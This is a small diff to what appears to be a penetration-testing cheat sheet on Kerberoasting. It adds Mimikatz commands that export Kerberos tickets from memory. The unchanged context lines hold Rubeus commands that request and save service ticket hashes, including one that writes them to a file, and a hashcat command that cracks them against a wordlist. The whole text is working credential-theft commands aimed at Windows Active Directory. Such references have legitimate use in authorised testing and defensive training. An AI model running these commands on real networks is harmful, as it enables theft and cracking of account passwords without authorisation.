@@ -301,6 +301,11 @@ Rubeus.exe kerberoast /user:analystm2 /nowrap
 Rubeus.exe kerberoast /user:analystm2 /nowrap /simple
 Rubeus.exe kerberoast /user:analystm2 /nowrap /simple /outfile:C:\hashestgt.txt
 ```
+```
+.\mimikatz.exe
+kerberos::list /export
+Invoke-Mimikatz -Command '"kerberos::list /export"'
+```
 ##### KERBEROASTING - CRACK PASSWORD
 ```
 hashcat -m 13100 -a 0 hashestgt.txt wordlist.txt
